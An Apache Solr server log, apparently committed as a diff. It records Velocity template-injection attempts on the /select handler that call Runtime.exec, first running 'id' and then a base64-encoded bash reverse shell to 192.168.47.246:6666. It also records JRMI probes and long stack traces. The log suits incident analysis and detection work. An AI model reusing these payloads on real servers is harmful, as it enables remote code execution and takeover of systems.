+2020-03-26 03:30:19.439 ERROR (qtp12209492-20) [   x:te1] o.a.s.h.RequestHandlerBase org.apache.solr.common.SolrException: Bad contentType for search handler :null request={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('id'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity}
+	at org.apache.solr.request.json.RequestUtil.processParams(RequestUtil.java:73)
+	at org.apache.solr.util.SolrPluginUtils.setDefaults(SolrPluginUtils.java:167)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:174)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 03:30:19.441 INFO  (qtp12209492-20) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/select params={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('id'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity} status=400 QTime=50
+2020-03-26 03:30:19.442 INFO  (qtp12209492-20) [   x:te1] o.a.s.c.PluginBag Going to create a new queryResponseWriter with {type = queryResponseWriter,name = velocity,class = solr.VelocityResponseWriter,attributes = {startup=lazy, name=velocity, class=solr.VelocityResponseWriter, template.base.dir=, solr.resource.loader.enabled=true, params.resource.loader.enabled=true},args = {startup=lazy,template.base.dir=,solr.resource.loader.enabled=true,params.resource.loader.enabled=true}} 
+2020-03-26 03:41:38.598 WARN  (qtp12209492-16) [   x:te1] o.e.j.h.HttpParser Illegal character 0x0 in state=METHOD for buffer HeapByteBuffer@3aefeed4[p=5,l=13,c=8192,r=8]={JRMI\x00<<<\x02K\x00\x00\x00\x00\x00\x00>>>1/config HTTP/1.1...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}
+2020-03-26 03:41:38.756 WARN  (qtp12209492-16) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Illegal character 0x0 for HttpChannelOverHttp@1a631d8d{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 03:47:42.142 WARN  (qtp12209492-20) [   x:te1] o.e.j.h.HttpParser Illegal character 0x0 in state=METHOD for buffer HeapByteBuffer@ea917bb[p=5,l=13,c=8192,r=8]={JRMI\x00<<<\x02K\x00\x00\x00\x00\x00\x00>>>OK\r\nLast-Modified...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}
+2020-03-26 03:47:42.148 WARN  (qtp12209492-20) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Illegal character 0x0 for HttpChannelOverHttp@cfe92b1{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 03:48:04.121 WARN  (qtp12209492-38) [   ] o.e.j.h.HttpParser Illegal character 0x0 in state=METHOD for buffer HeapByteBuffer@4efecc6c[p=5,l=13,c=8192,r=8]={JRMI\x00<<<\x02K\x00\x00\x00\x00\x00\x00>>>Bad Request\r\nCont...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}
+2020-03-26 03:48:04.122 WARN  (qtp12209492-38) [   ] o.e.j.h.HttpParser bad HTTP parsed: 400 Illegal character 0x0 for HttpChannelOverHttp@1f412ec8{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 03:53:33.940 WARN  (qtp12209492-18) [   ] o.e.j.h.HttpParser Illegal character 0x0 in state=METHOD for buffer HeapByteBuffer@657f1a4a[p=5,l=13,c=8192,r=8]={JRMI\x00<<<\x02K\x00\x00\x00\x00\x00\x00>>>Illegal character...\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}
+2020-03-26 03:53:33.942 WARN  (qtp12209492-18) [   ] o.e.j.h.HttpParser bad HTTP parsed: 400 Illegal character 0x0 for HttpChannelOverHttp@135bfd88{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 04:01:12.348 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/config params={} status=0 QTime=179
+2020-03-26 04:56:25.246 WARN  (qtp12209492-14) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@3c1f16c0{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 04:56:55.224 WARN  (qtp12209492-37) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@bbd1434{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:00:21.540 WARN  (qtp12209492-13) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@2c913f66{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:02:08.920 WARN  (qtp12209492-13) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@73ae0685{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:02:43.379 WARN  (qtp12209492-12) [   ] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@752a1aea{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:04:57.277 WARN  (qtp12209492-18) [   ] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@bdf60a7{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:04:59.192 WARN  (qtp12209492-19) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@4234aba0{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:10:11.239 WARN  (qtp12209492-12) [   ] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@7f15f77c{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:10:12.808 WARN  (qtp12209492-13) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@30f72b6a{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:10:14.262 WARN  (qtp12209492-19) [   x:te1] o.e.j.h.HttpParser bad HTTP parsed: 400 Unknown Version for HttpChannelOverHttp@3eed6e1f{r=0,c=false,a=IDLE,uri=null}
+2020-03-26 05:11:15.400 ERROR (qtp12209492-12) [   x:te1] o.a.s.h.RequestHandlerBase org.apache.solr.common.SolrException: Bad contentType for search handler :null request={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('bash+-c+%2B{echo,YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC40Ny4yNDYvNjY2NiUyMDAlM0UlMjYx}|{base64,-d}|{bash,-i}'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity}
+	at org.apache.solr.request.json.RequestUtil.processParams(RequestUtil.java:73)
+	at org.apache.solr.util.SolrPluginUtils.setDefaults(SolrPluginUtils.java:167)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:174)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 05:11:15.407 INFO  (qtp12209492-12) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/select params={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('bash+-c+%2B{echo,YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC40Ny4yNDYvNjY2NiUyMDAlM0UlMjYx}|{base64,-d}|{bash,-i}'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity} status=400 QTime=827
+2020-03-26 05:11:36.909 ERROR (qtp12209492-12) [   x:te1] o.a.s.s.HttpSolrCall null:org.apache.velocity.exception.MethodInvocationException: Invocation of method 'toChars' in  class java.lang.Class threw exception java.lang.IllegalArgumentException at custom.vm[line 1, column 415]
+	at org.apache.velocity.runtime.parser.node.ASTMethod.handleInvocationException(ASTMethod.java:243)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:187)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.value(ASTReference.java:567)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:151)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.render(ASTReference.java:369)
+	at org.apache.velocity.runtime.parser.node.ASTBlock.render(ASTBlock.java:72)
+	at org.apache.velocity.runtime.directive.Foreach.render(Foreach.java:420)
+	at org.apache.velocity.runtime.parser.node.ASTDirective.render(ASTDirective.java:207)
+	at org.apache.velocity.runtime.parser.node.SimpleNode.render(SimpleNode.java:342)
+	at org.apache.velocity.Template.merge(Template.java:356)
+	at org.apache.velocity.Template.merge(Template.java:260)
+	at org.apache.solr.response.VelocityResponseWriter.write(VelocityResponseWriter.java:169)
+	at org.apache.solr.response.QueryResponseWriterUtil.writeQueryResponse(QueryResponseWriterUtil.java:65)
+	at org.apache.solr.servlet.HttpSolrCall.writeResponse(HttpSolrCall.java:806)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:535)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+Caused by: java.lang.IllegalArgumentException
+	at java.lang.Character.toChars(Character.java:5190)
+	at sun.reflect.GeneratedMethodAccessor18.invoke(Unknown Source)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.lang.reflect.Method.invoke(Method.java:498)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.doInvoke(UberspectImpl.java:395)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.invoke(UberspectImpl.java:384)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:173)
+	... 44 more
+
+2020-03-26 05:11:37.681 ERROR (qtp12209492-12) [   x:te1] o.a.s.s.HttpSolrCall null:org.apache.velocity.exception.MethodInvocationException: Invocation of method 'toChars' in  class java.lang.Class threw exception java.lang.IllegalArgumentException at custom.vm[line 1, column 415]
+	at org.apache.velocity.runtime.parser.node.ASTMethod.handleInvocationException(ASTMethod.java:243)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:187)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.value(ASTReference.java:567)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:151)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.render(ASTReference.java:369)
+	at org.apache.velocity.runtime.parser.node.ASTBlock.render(ASTBlock.java:72)
+	at org.apache.velocity.runtime.directive.Foreach.render(Foreach.java:420)
+	at org.apache.velocity.runtime.parser.node.ASTDirective.render(ASTDirective.java:207)
+	at org.apache.velocity.runtime.parser.node.SimpleNode.render(SimpleNode.java:342)
+	at org.apache.velocity.Template.merge(Template.java:356)
+	at org.apache.velocity.Template.merge(Template.java:260)
+	at org.apache.solr.response.VelocityResponseWriter.write(VelocityResponseWriter.java:169)
+	at org.apache.solr.response.QueryResponseWriterUtil.writeQueryResponse(QueryResponseWriterUtil.java:65)
+	at org.apache.solr.servlet.HttpSolrCall.writeResponse(HttpSolrCall.java:806)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:535)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+Caused by: java.lang.IllegalArgumentException
+	at java.lang.Character.toChars(Character.java:5190)
+	at sun.reflect.GeneratedMethodAccessor18.invoke(Unknown Source)
+	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
+	at java.lang.reflect.Method.invoke(Method.java:498)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.doInvoke(UberspectImpl.java:395)
+	at org.apache.velocity.util.introspection.UberspectImpl$VelMethodImpl.invoke(UberspectImpl.java:384)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:173)
+	... 44 more
+
+2020-03-26 05:13:14.439 ERROR (qtp12209492-13) [   x:te1] o.a.s.h.RequestHandlerBase org.apache.solr.common.SolrException: Bad contentType for search handler :null request={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('bash+-c+%2B{echo,YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC40Ny4yNDYvNjY2NiUyMDAlM0UlMjYx}|{base64,-d}|{bash,-i}'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity}
+	at org.apache.solr.request.json.RequestUtil.processParams(RequestUtil.java:73)
+	at org.apache.solr.util.SolrPluginUtils.setDefaults(SolrPluginUtils.java:167)
+	at org.apache.solr.handler.RequestHandlerBase.handleRequest(RequestHandlerBase.java:174)
+	at org.apache.solr.core.SolrCore.execute(SolrCore.java:2474)
+	at org.apache.solr.servlet.HttpSolrCall.execute(HttpSolrCall.java:720)
+	at org.apache.solr.servlet.HttpSolrCall.call(HttpSolrCall.java:526)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:378)
+	at org.apache.solr.servlet.SolrDispatchFilter.doFilter(SolrDispatchFilter.java:322)
+	at org.eclipse.jetty.servlet.ServletHandler$CachedChain.doFilter(ServletHandler.java:1691)
+	at org.eclipse.jetty.servlet.ServletHandler.doHandle(ServletHandler.java:582)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:143)
+	at org.eclipse.jetty.security.SecurityHandler.handle(SecurityHandler.java:548)
+	at org.eclipse.jetty.server.session.SessionHandler.doHandle(SessionHandler.java:226)
+	at org.eclipse.jetty.server.handler.ContextHandler.doHandle(ContextHandler.java:1180)
+	at org.eclipse.jetty.servlet.ServletHandler.doScope(ServletHandler.java:512)
+	at org.eclipse.jetty.server.session.SessionHandler.doScope(SessionHandler.java:185)
+	at org.eclipse.jetty.server.handler.ContextHandler.doScope(ContextHandler.java:1112)
+	at org.eclipse.jetty.server.handler.ScopedHandler.handle(ScopedHandler.java:141)
+	at org.eclipse.jetty.server.handler.ContextHandlerCollection.handle(ContextHandlerCollection.java:213)
+	at org.eclipse.jetty.server.handler.HandlerCollection.handle(HandlerCollection.java:119)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.rewrite.handler.RewriteHandler.handle(RewriteHandler.java:335)
+	at org.eclipse.jetty.server.handler.HandlerWrapper.handle(HandlerWrapper.java:134)
+	at org.eclipse.jetty.server.Server.handle(Server.java:534)
+	at org.eclipse.jetty.server.HttpChannel.handle(HttpChannel.java:320)
+	at org.eclipse.jetty.server.HttpConnection.onFillable(HttpConnection.java:251)
+	at org.eclipse.jetty.io.AbstractConnection$ReadCallback.succeeded(AbstractConnection.java:273)
+	at org.eclipse.jetty.io.FillInterest.fillable(FillInterest.java:95)
+	at org.eclipse.jetty.io.SelectChannelEndPoint$2.run(SelectChannelEndPoint.java:93)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.executeProduceConsume(ExecuteProduceConsume.java:303)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.produceConsume(ExecuteProduceConsume.java:148)
+	at org.eclipse.jetty.util.thread.strategy.ExecuteProduceConsume.run(ExecuteProduceConsume.java:136)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool.runJob(QueuedThreadPool.java:671)
+	at org.eclipse.jetty.util.thread.QueuedThreadPool$2.run(QueuedThreadPool.java:589)
+	at java.lang.Thread.run(Thread.java:748)
+
+2020-03-26 05:13:14.440 INFO  (qtp12209492-13) [   x:te1] o.a.s.c.S.Request [te1]  webapp=/solr path=/select params={q=1&v.template=custom&v.template.custom=#set($x%3D'')+#set($rt%3D$x.class.forName('java.lang.Runtime'))+#set($chr%3D$x.class.forName('java.lang.Character'))+#set($str%3D$x.class.forName('java.lang.String'))+#set($ex%3D$rt.getRuntime().exec('bash+-c+%2B{echo,YmFzaCUyMC1pJTIwJTNFJTI2JTIwL2Rldi90Y3AvMTkyLjE2OC40Ny4yNDYvNjY2NiUyMDAlM0UlMjYx}|{base64,-d}|{bash,-i}'))+$ex.waitFor()+#set($out%3D$ex.getInputStream())+#foreach($i+in+[1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end&wt=velocity} status=400 QTime=2
+2020-03-26 05:13:15.157 ERROR (qtp12209492-13) [   x:te1] o.a.s.s.HttpSolrCall null:org.apache.velocity.exception.MethodInvocationException: Invocation of method 'toChars' in  class java.lang.Class threw exception java.lang.IllegalArgumentException at custom.vm[line 1, column 415]
+	at org.apache.velocity.runtime.parser.node.ASTMethod.handleInvocationException(ASTMethod.java:243)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:187)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.value(ASTReference.java:567)
+	at org.apache.velocity.runtime.parser.node.ASTMethod.execute(ASTMethod.java:151)
+	at org.apache.velocity.runtime.parser.node.ASTReference.execute(ASTReference.java:280)
+	at org.apache.velocity.runtime.parser.node.ASTReference.render(ASTReference.java:369)
+	at org.apache.velocity.runtime.parser.node.ASTBlock.render(ASTBlock.java:72)
+	at org.apache.velocity.runtime.directive.Foreach.render(Foreach.java:420)
+	at org.apache.velocity.runtime.parser.node.ASTDirective.render(ASTDirective.java:207)
+	at org.apache.velocity.runtime.parser.node.SimpleNode.render(SimpleNode.java:342)
+	at org.apache.velocity.Template.merge(Template.java:356)
+	at org.apache.velocity.Template.merge(Template.java:260)
+	at org.apache.solr.response.VelocityResponseWriter.write(VelocityResponseWriter.java:169)
+	at org.apache.solr.response.QueryResponseWriterUtil.writeQueryResponse(QueryResponseWriterUtil.java:65)
+	at org.apache.solr.servlet.HttpSolrCall.writeResponse(HttpSolrCall.java:806)
